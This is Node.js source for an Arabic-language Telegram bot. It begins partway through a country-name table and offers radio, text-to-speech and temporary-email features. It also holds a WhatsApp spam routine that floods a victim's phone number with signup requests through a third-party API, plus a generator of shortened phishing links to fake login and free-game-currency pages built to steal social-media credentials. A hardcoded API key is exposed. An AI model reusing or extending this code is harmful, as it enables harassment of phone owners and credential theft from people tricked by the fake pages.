  "Jamaica": "جامايكا 🇯🇲",
  "Japan": "اليابان 🇯🇵",
  "Kazakhstan": "كازاخستان 🇰🇿",
  "Kenya": "كينيا 🇰🇪",
  "South Korea": "كوريا الجنوبية 🇰🇷",
  "North Korea": "كوريا الشمالية 🇰🇵",
  "Kosovo": "كوسوفو 🇽🇰",
  "Laos": "لاوس 🇱🇦",
  "Latvia": "لاتفيا 🇱🇻",
  "Lithuania": "ليتوانيا 🇱🇹",
  "Luxembourg": "لوكسمبورغ 🇱🇺",
  "Madagascar": "مدغشقر 🇲🇬",
  "Malaysia": "ماليزيا 🇲🇾",
  "Malta": "مالطا 🇲🇹",
  "Mexico": "المكسيك 🇲🇽",
  "Moldova": "مولدوفا 🇲🇩",
  "Monaco": "موناكو 🇲🇨",
  "Mongolia": "منغوليا 🇲🇳",
  "Montenegro": "الجبل الأسود 🇲🇪",
  "Nepal": "نيبال 🇳🇵",
  "Netherlands": "هولندا 🇳🇱",
  "New Zealand": "نيوزيلندا 🇳🇿",
  "Nicaragua": "نيكاراغوا 🇳🇮",
  "Nigeria": "نيجيريا 🇳🇬",
  "Norway": "النرويج 🇳🇴",
  "Pakistan": "باكستان 🇵🇰",
  "Panama": "بنما 🇵🇦",
  "Paraguay": "باراغواي 🇵🇾",
  "Peru": "بيرو 🇵🇪",
  "Philippines": "الفلبين 🇵🇭",
  "Poland": "بولندا 🇵🇱",
  "Portugal": "البرتغال 🇵🇹",
  "Romania": "رومانيا 🇷🇴",
  "Russia": "روسيا 🇷🇺",
  "Rwanda": "رواندا 🇷🇼",
  "Senegal": "السنغال 🇸🇳",
  "Serbia": "صربيا 🇷🇸",
  "Singapore": "سنغافورة 🇸🇬",
  "Slovakia": "سلوفاكيا 🇸🇰",
  "Slovenia": "سلوفينيا 🇸🇮",
  "South Africa": "جنوب أفريقيا 🇿🇦",
  "Spain": "إسبانيا 🇪🇸",
  "Sri Lanka": "سريلانكا 🇱🇰",
  "Sweden": "السويد 🇸🇪",
  "Switzerland": "سويسرا 🇨🇭",
  "Tanzania": "تنزانيا 🇹🇿",
  "Thailand": "تايلاند 🇹🇭",
  "Trinidad and Tobago": "ترينيداد وتوباغو 🇹🇹",
  "Turkey": "تركيا 🇹🇷",
  "Uganda": "أوغندا 🇺🇬",
  "Ukraine": "أوكرانيا 🇺🇦",
  "United Kingdom": "المملكة المتحدة 🇬🇧",
  "United States": "الولايات المتحدة 🇺🇸",
  "Uruguay": "أوروغواي 🇺🇾",
  "Uzbekistan": "أوزبكستان 🇺🇿",
  "Venezuela": "فنزويلا 🇻🇪",
  "Vietnam": "فيتنام 🇻🇳",
  "Zambia": "زامبيا 🇿🇲",
  "Zimbabwe": "زيمبابوي 🇿🇼",
  "Antigua and Barbuda": "أنتيغوا وبربودا 🇦🇬",
  "Saint Kitts and Nevis": "سانت كيتس ونيفيس 🇰🇳",
  "Dominica": "دومينيكا 🇩🇲",
  "Saint Lucia": "سانت لوسيا 🇱🇨",
  "Grenada": "غرينادا 🇬🇩",
  "Bahamas": "الباهاماس 🇧🇸",
  "Barbados": "باربادوس 🇧🇧",
  "Saint Vincent and the Grenadines": "سانت فنسنت والغرينادين 🇻🇨",
  "Jamaica": "جامايكا 🇯🇲",
  "Haiti": "هايتي 🇭🇹",
  "Cuba": "كوبا 🇨🇺",
  "Guyana": "غيانا 🇬🇾",
  "Suriname": "سورينام 🇸🇷",
  "Vatican City": "الفاتيكان 🇻🇦",
  "Andorra": "أندورا 🇦🇩",
  "San Marino": "سان مارينو 🇸🇲",
  "Liechtenstein": "ليختنشتاين 🇱🇮",
  "Maldives": "المالديف 🇲🇻",
  "Fiji": "فيجي 🇫🇯",
  "Papua New Guinea": "بابوا غينيا الجديدة 🇵🇬",
  "Samoa": "ساموا 🇼🇸",
  "Tonga": "تونغا 🇹🇴",
  "Vanuatu": "فانواتو 🇻🇺",
  "Solomon Islands": "جزر سليمان 🇸🇧",
  "Micronesia": "ميكرونيزيا 🇫🇲",
  "Palau": "بالاو 🇵🇼",
  "Marshall Islands": "جزر مارشال 🇲🇭",
  "Kiribati": "كيريباس 🇰🇮",
  "Nauru": "ناورو 🇳🇷",
  "Tuvalu": "توفالو 🇹🇻"
};
// دالة لجلب قائمة الدول من Radio Browser API
async function getCountries() {
  try {
    const response = await axios.get('https://de1.api.radio-browser.info/json/countries');
    const countries = response.data;
    return countries
      .filter((country) => country.stationcount > 0)
      .map((country) => country.name)
      .sort();
  } catch (error) {
    console.error('خطأ في جلب الدول:', error);
    return [];
  }
}


async function getStations(country) {
  try {
    const response = await axios.get(`https://de1.api.radio-browser.info/json/stations/bycountry/${country}`, {
      params: {
        limit: 20,
        order: 'popularity',
        reverse: 'true'
      }
    });
    return response.data;
  } catch (error) {
    console.error('خطأ في جلب محطات الراديو:', error);
    return [];
  }
}

// دالة لعرض قائمة الدول
function showCountryList(chatId, startIndex = 0) {
  const buttons = [];
  const countryCodes = Object.keys(countryTranslation);
  const countryNames = Object.values(countryTranslation);

  const endIndex = Math.min(startIndex + 70, countryCodes.length);

  for (let i = startIndex; i < endIndex; i += 3) {
    const row = [];
    for (let j = i; j < i + 3 && j < endIndex; j++) {
      const code = countryCodes[j];
      const name = countryNames[j];
      row.push({ text: name, callback_data: `country_${code}` });
    }
    buttons.push(row);
  }

  const navigationButtons = [];
  if (startIndex > 0) {
    navigationButtons.push({ text: "السابق", callback_data: `prev_${startIndex - 70}` });
  }
  if (endIndex < countryCodes.length) {
    navigationButtons.push({ text: "التالي", callback_data: `next_${endIndex}` });
  }

  if (navigationButtons.length) {
    buttons.push(navigationButtons);
  }

  bot.sendMessage(chatId, "اختر الدولة:", {
    reply_markup: {
      inline_keyboard: buttons
    }
  });
}


// التعامل مع الأزرار التفاعلية
bot.on('callback_query', async (query) => {
  const chatId = query.message.chat.id;

  if (query.data === 'radio_stations') {
    const countries = await getCountries();
    showCountryList(chatId); // عرض قائمة الدول
  } else if (query.data.startsWith('country_')) {
    const countryCode = query.data.split('_')[1];
    const arabicName = countryTranslation[countryCode] || countryCode;

    const stations = await getStations(countryCode);
    if (stations.length > 0) {
      let message = `محطات الراديو المتاحة في ${arabicName}:\n\n`;
      stations.forEach((station) => {
        message += `اسم المحطة: ${station.name}\n`;
        message += `رابط البث: ${station.url}\n\n`;
      });
      bot.sendMessage(chatId, message);
    } else {
      bot.sendMessage(chatId, `عذرًا، لم نتمكن من العثور على محطات راديو لـ ${arabicName}.`);
    }
  } else if (query.data.startsWith('next_')) {
    const nextIndex = parseInt(query.data.split('_')[1], 10);
    showCountryList(chatId, nextIndex);
  } else if (query.data.startsWith('prev_')) {
    const prevIndex = parseInt(query.data.split('_')[1], 10);
    showCountryList(chatId, prevIndex);
  }
});



const VOICERSS_API_KEY = 'cbee32ada8744ab299d7178348b0c6f3';

// دالة لتحويل النص إلى صوت باستخدام VoiceRSS (صوت الذكر)
async function convertTextToMaleVoice(text) {
  const fileName = `tts_${Date.now()}.mp3`;
  const voice = 'ar-sa_male'; // صوت ذكر

  const url = `https://api.voicerss.org/?key=${VOICERSS_API_KEY}&hl=ar-sa&src=${encodeURIComponent(text)}&v=${voice}&f=44khz_16bit_stereo`;

  return downloadAudio(url, fileName);
}

// دالة لتحويل النص إلى صوت باستخدام Google TTS (صوت الأنثى)
async function convertTextToFemaleVoice(text) {
  const fileName = `tts_${Date.now()}.mp3`;
  const url = googleTTS.getAudioUrl(text, {
    lang: 'ar', // اللغة العربية
    slow: false,
    host: 'https://translate.google.com',
  });

  return downloadAudio(url, fileName);
}

// دالة لتنزيل الصوت من رابط معين
async function downloadAudio(url, filename) {
  return new Promise((resolve, reject) => {
    https.get(url, (response) => {
      if (response.statusCode !== 200) {
        reject(new Error(`Failed to download file: ${response.statusCode}`));
        return;
      }
      const writeStream = fs.createWriteStream(filename);
      response.pipe(writeStream);
      writeStream.on('finish', () => {
        writeStream.close();
        resolve(filename);
      });
    }).on('error', reject);
  });
}


// استماع للضغط على زر "تحويل النص إلى صوت"
bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;

  if (callbackQuery.data === 'convert_to_speech') {
    bot.sendMessage(chatId, 'اختر نوع الصوت:', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'صوت ذكر', callback_data: 'male_voice' }],
          [{ text: 'صوت أنثى', callback_data: 'female_voice' }]
        ]
      }
    });
  } else if (callbackQuery.data === 'male_voice' || callbackQuery.data === 'female_voice') {
    const gender = callbackQuery.data === 'male_voice' ? 'male' : 'female';

    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
      chat_id: chatId,
      message_id: callbackQuery.message.message_id
    });

    const genderText = gender === 'male' ? 'ذكر' : 'أنثى';
    bot.sendMessage(chatId, `الآن أرسل النص الذي تريد تحويله إلى صوت بصوت ${genderText}.`);

    bot.once('message', async (msg) => {
      const text = msg.text;

      try {
        let ttsFileName;

        if (gender === 'male') {
          // استخدام VoiceRSS لتحويل النص إلى صوت ذكر
          ttsFileName = await convertTextToMaleVoice(text);
        } else {
          // استخدام Google TTS لتحويل النص إلى صوت أنثى
          ttsFileName = await convertTextToFemaleVoice(text);
        }

        // إرسال الصوت المحول
        await bot.sendVoice(chatId, fs.createReadStream(ttsFileName));

        // حذف الملفات المؤقتة
        fs.unlinkSync(ttsFileName);
      } catch (error) {
        console.error('Error:', error);
        bot.sendMessage(chatId, 'حدث خطأ أثناء تحويل النص إلى صوت.');
      }
    });
  }
});



const BASE_URL = 'https://www.1secmail.com/api/v1/';


// متغير عالمي لحفظ عنوان البريد الإلكتروني
let emailAddress = null;

// دالة لإنشاء اسم عشوائي
function generateRandomName(length = 2) {
  return Array.from({ length }, () => Math.floor(Math.random() * 10)).join('');
}

// دالة لإنشاء بريد إلكتروني
function createEmail() {
  const randomPart = generateRandomName();
  const domain = '1secmail.com';
  emailAddress = `sjgdsoft${randomPart}@${domain}`;
  return emailAddress;
}

// دالة للحصول على الرسائل
async function getMessages() {
  if (!emailAddress) return null;
  
  const [username, domain] = emailAddress.split('@');
  const messagesUrl = `${BASE_URL}?action=getMessages&login=${username}&domain=${domain}`;
  
  try {
    const response = await axios.get(messagesUrl);
    return response.data;
  } catch (error) {
    console.error('Error fetching messages:', error);
    return null;
  }
}

// دالة للحصول على محتوى رسالة محددة
async function getMessageContent(messageId) {
  if (!emailAddress) return null;
  
  const [username, domain] = emailAddress.split('@');
  const contentUrl = `${BASE_URL}?action=readMessage&login=${username}&domain=${domain}&id=${messageId}`;
  
  try {
    const response = await axios.get(contentUrl);
    return response.data;
  } catch (error) {
    console.error('Error fetching message content:', error);
    return null;
  }
}

// دالة لتنظيف النص من وسوم HTML
function cleanHtml(rawHtml) {
  return rawHtml.replace(/<[^>]*>?/gm, '');
}


// معالجة الضغط على الأزرار
bot.on('callback_query', (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === 'create_email') {
    const instructions = `يمكنك إنشاء إيميل وهمي عن طريق اتباع الأوامر التالية:

لإنشاء إيميل وهمي: /email

لإظهار الإيميل الذي تم إنشاؤه: /an

لعرض الرسائل التي تم استلامها: /Messages

لحذف الإيميل السابق: /de

يرجى اتباع هذه الأوامر للاستفادة من الخدمة.`;
    
    bot.editMessageText(instructions, {
      chat_id: chatId,
      message_id: callbackQuery.message.message_id,
      parse_mode: 'Markdown'
    });
  }
});

// معالجة أمر إنشاء البريد الإلكتروني
bot.onText(/\/email/, (msg) => {
  const chatId = msg.chat.id;
  const newEmail = createEmail();
  bot.sendMessage(chatId, `تم إنشاء البريد المؤقت بنجاح!\n\nالبريد الإلكتروني: \`${newEmail}\`\n\nيمكنك نسخ البريد الإلكتروني بالضغط عليه.`, {
    parse_mode: 'Markdown'
  });
});

// معالجة أمر عرض البريد الإلكتروني الحالي
bot.onText(/\/an/, (msg) => {
  const chatId = msg.chat.id;
  if (emailAddress) {
    bot.sendMessage(chatId, `البريد الإلكتروني الحالي هو:\n\`${emailAddress}\``, {
      parse_mode: 'Markdown'
    });
  } else {
    bot.sendMessage(chatId, 'لم يتم إنشاء بريد إلكتروني بعد. استخدم الأمر /email لإنشاء بريد جديد.');
  }
});

// معالجة أمر عرض الرسائل
bot.onText(/\/Messages/, async (msg) => {
  const chatId = msg.chat.id;
  const messages = await getMessages();
  
  if (messages && messages.length > 0) {
    for (const message of messages) {
      const messageContent = await getMessageContent(message.id);
      if (messageContent) {
        const fromEmail = messageContent.from;
        const subject = messageContent.subject;
        const body = cleanHtml(messageContent.body);
        const responseText = `من: ${fromEmail}\nالموضوع: ${subject}\n\nمحتوى الرسالة: ${body}\n\n---`;
        bot.sendMessage(chatId, responseText);
      }
    }
  } else {
    bot.sendMessage(chatId, 'لا توجد رسائل جديدة أو لم يتم إنشاء بريد مؤقت بعد.');
  }
});

// معالجة أمر حذف البريد الإلكتروني
bot.onText(/\/de/, (msg) => {
  const chatId = msg.chat.id;
  if (emailAddress) {
    emailAddress = null;
    bot.sendMessage(chatId, 'تم حذف البريد الإلكتروني بنجاح.');
  } else {
    bot.sendMessage(chatId, 'لا يوجد بريد إلكتروني لحذفه.');
  }
});



bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;

    // تحقق مما إذا كانت بيانات المستخدم غير موجودة، ثم قم بتهيئتها إذا كانت غير موجودة
    if (!allUsers[chatId]) {
        allUsers[chatId] = {
            step: 'initial',
            GOOD: 0,
            BAD: 0,
            messageId: null
        };
    }

    if (query.data === 'whatsapp_spam') {
        allUsers[chatId].step = 'country_code';
        bot.sendMessage(chatId, "أدخل رمز الدولة (بدون +):");
    }
});

// التعامل مع الرسائل النصية
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text.trim();

    if (!allUsers[chatId]) return; // تجاهل الرسائل إذا لم يكن هناك بيانات للمستخدم

    const userStep = allUsers[chatId].step;

    switch (userStep) {
        case 'country_code':
            if (text.startsWith('/')) return; // تجاهل الأوامر الأخرى مثل /start
            allUsers[chatId].countryCode = text;
            allUsers[chatId].step = 'phone_number';
            bot.sendMessage(chatId, "أدخل رقم الهاتف:");
            break;

        case 'phone_number':
            allUsers[chatId].phoneNumber = text;
            allUsers[chatId].step = 'proxy';
            bot.sendMessage(chatId, "أدخل البروكسي (اختياري، اكتب 'لا' إذا لم يكن لديك بروكسي):");
            break;

        case 'proxy':
            allUsers[chatId].proxy = text.toLowerCase() === 'لا' ? null : text;
            allUsers[chatId].step = 'sending_requests';
            startSendingRequests(chatId, allUsers[chatId]);
            break;
    }
});

// بدء إرسال الطلبات
async function startSendingRequests(chatId, userData) {
    console.clear();
    const initialMessage = await bot.sendMessage(chatId, "بدأ إرسال الطلبات...\nSuccess: 0\nFailed: 0");
    userData.messageId = initialMessage.message_id;

    const sendRequest = async () => {
        try {
            const url = "https://gw.abgateway.com/student/whatsapp/signup";
            const headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
                'Accept': "application/json",
                'Content-Type': "application/json",
                'x-trace-id': `guest_user:${Math.floor(Math.random() * 900000) + 100000}`,
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': "?1",
                'access-control-allow-origin': "*",
                'platform': "web",
                'sec-ch-ua-platform': '"Android"',
                'origin': "https://abwaab.com",
                'sec-fetch-site': "cross-site",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://abwaab.com/",
                'accept-language': "ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7",
                'priority': "u=1, i"
            };

            const payload = {
                language: "ar",
                password: "12341ghf23",
                phone: `+${userData.countryCode}${userData.phoneNumber}`,
                country_code: userData.countryCode,
                platform: "web"
            };

            const response = await axios.post(url, payload, { headers, proxy: userData.proxy ? { host: userData.proxy } : undefined });

            if (response.status === 200) {
                userData.GOOD++;
            } else {
                userData.BAD++;
            }

            // تحديث الرسالة الحالية بدلاً من إرسال رسالة جديدة
            await bot.editMessageText(`بدأ إرسال الطلبات...\nتم الارسال بنجاح: ${userData.GOOD}\nفشل الارسال: ${userData.BAD}`, {
                chat_id: chatId,
                message_id: userData.messageId
            });

            await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 1000));
        } catch (error) {
            userData.BAD++;
            await bot.editMessageText(`بدأ إرسال الطلبات...\nتم الارسال بنجاح: ${userData.GOOD}\nفشل الارسال: ${userData.BAD}\nError: ${error.message}`, {
                chat_id: chatId,
                message_id: userData.messageId
            });
        }
    };

    const promises = [];
    for (let i = 0; i < 10; i++) {
        promises.push(sendRequest());
    }

    await Promise.all(promises);
}


bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const baseUrl = 'https://snow-fringe-play.glitch.me'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك

    console.log('Received callback query:', data);

    let url, message;

    function shortenUrlAndSendMessage(url, messagePrefix) {
        axios.get(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`)
            .then(response => {
                const shortUrl = response.data;
                bot.sendMessage(chatId, `${messagePrefix} ${shortUrl}`);
            })
            .catch(error => {
                bot.sendMessage(chatId, 'حدث خطأ أثناء اختصار الرابط. الرجاء المحاولة لاحقًا.');
            });
    }

    if (data.startsWith('login_')) {
        const platform = data.split('_')[1];
        url = `${baseUrl}/login/${platform}/${chatId}`;
        message = `تم تلغيم رابط اندكس تسجيل دخول يشبه الصفحة الحقيقية لحد المنصة: ${getPlatformName(platform)}:`;
        shortenUrlAndSendMessage(url, message);
    } else if (data === 'pubg_uc' || data === 'free_fire_diamonds') {
        const game = data === 'pubg_uc' ? 'pubg_uc' : 'free_fire_diamonds';
        url = `${baseUrl}/increase/${game}/${chatId}`;
        message = `تم تلغيم رابط اختراق على شكل صفحة مزورة لشحن ${getPlatformName(game)} مجانًا:`;
        shortenUrlAndSendMessage(url, message);
    } else if (data.startsWith('increase_')) {
        const platform = data.split('_')[1];
        url = `${baseUrl}/increase/${platform}/${chatId}`;
        message = `تم تلغيم رابط اختراق على شكل صفحة مزورة لزيادة المتابعين ${getPlatformName(platform)}:`;
        shortenUrlAndSendMessage(url, message);
    } else {
        console.log('Unhandled callback query:', data);
        return;
    }
});

function getPlatformName(platform) {
    const platformNames = {
        tiktok: 'تيك توك',
        instagram: 'انستغرام',
        facebook: 'فيسبوك',
        snapchat: 'سناب شات',
        pubg_uc: 'شدات ببجي',
        youtube: 'يوتيوب',
        twitter: 'تويتر',
        free_fire_diamonds: 'جواهر فري فاير'
    };
    return platformNames[platform] || platform;
}


const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

